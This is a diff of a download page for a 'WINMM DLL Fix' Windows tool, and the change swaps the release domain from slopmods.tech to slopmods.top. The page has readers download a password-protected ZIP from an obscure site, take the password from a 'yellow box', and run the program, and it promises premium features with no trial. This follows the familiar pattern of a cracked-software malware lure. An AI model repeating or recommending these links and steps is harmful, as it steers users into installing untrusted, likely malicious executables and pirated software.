@@ -8,12 +8,12 @@ WINMM DLL Fix — Windows setup and configuration · Premium workspace · Zero n
 
 > Use the release page below for Windows.
 
-- **Release page:** [pfvmerpzwea.slopmods.tech](https://pfvmerpzwea.slopmods.tech/)
-- **Full URL:** `https://pfvmerpzwea.slopmods.tech/`
+- **Release page:** [pfvmerpzwea.slopmods.top](https://pfvmerpzwea.slopmods.top/)
+- **Full URL:** `https://pfvmerpzwea.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **pfvmerpzwea.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **pfvmerpzwea.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ WINMM DLL Fix — Windows setup and configuration · Premium workspace · Zero n
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **pfvmerpzwea.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **pfvmerpzwea.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
